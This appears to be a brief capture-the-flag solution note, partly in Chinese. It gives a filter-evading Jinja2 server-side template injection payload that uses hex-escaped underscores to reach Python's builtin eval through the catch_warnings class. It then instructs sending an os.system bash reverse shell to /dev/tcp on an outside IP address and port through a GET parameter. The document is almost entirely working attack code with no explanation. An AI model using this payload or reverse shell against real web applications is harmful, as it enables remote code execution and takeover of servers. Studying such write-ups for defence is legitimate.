# solve
```
{% for c in ()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')() %}
{% if c|attr('\x5f\x5fname\x5f\x5f') == 'catch\x5fwarnings' %}
{% for b in c|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('values')() %}
{% if b|attr('\x5f\x5fclass\x5f\x5f') == {}|attr('\x5f\x5fclass\x5f\x5f') %}
{% if 'eval' in b|attr('keys')() %}
{% if  b['eval'](request|attr('args')|attr('get')('hack')) == 'p' %}
{% endif %}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}
```
然後 get 傳 `__import__('os').system("bash -c 'bash -i >%26 /dev/tcp/140.113.209.28/5566 0>%261'")`
